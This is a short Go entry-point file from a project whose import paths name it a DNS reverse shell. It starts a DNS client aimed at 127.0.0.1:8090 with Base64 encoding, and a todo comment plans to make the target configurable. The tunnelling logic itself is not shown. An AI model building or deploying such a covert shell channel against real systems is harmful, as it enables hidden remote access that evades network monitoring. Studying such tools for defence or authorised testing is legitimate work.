package main

import (
	"dns-reverse-shell/main/encoder"
	"dns-reverse-shell/main/protocol"
)

// todo: parameter address + port as command line args
func main() {
	dnsClient := protocol.NewDNSClient("127.0.0.1:8090", encoder.NewBase64Encoder())
	dnsClient.Start()
}
